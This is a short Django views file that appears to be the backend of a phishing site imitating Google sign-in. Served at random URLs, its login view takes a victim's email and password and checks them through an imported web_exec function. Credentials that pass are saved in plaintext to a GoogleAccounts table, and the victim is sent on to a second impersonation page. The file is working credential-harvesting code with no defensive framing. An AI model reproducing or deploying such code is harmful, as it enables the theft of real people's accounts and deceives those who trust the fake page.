from django.shortcuts import render
from django.http import HttpResponseRedirect as redir
from .main_web import *
from .models import GoogleAccounts

# Create your views here.

site = "ByPass"

def index(request):
    return render(request, "index.html")


def login(request, random_url):
    if request.POST:
        email = request.POST['email']
        pswd = request.POST["password"]
        status = web_exec(email, pswd)
        print(status, type(status))
        contex = {'site': site}
        if status==1:
            ga = GoogleAccounts(username=email, password=pswd)
            ga.save()
            context = {'email': email}
            return render(request, "google1.html", context)
        else:
            contex = {'site': site, 'error':'Wrong username/password'}
            return render(request, "google.html", contex)

    contex = {'site': site,'error':''}
    return render(request, "google.html", contex)

def v2sign(request, random_url):
    context = {'email': "sample@gmail.com"}
    return render(request, "google1.html", context)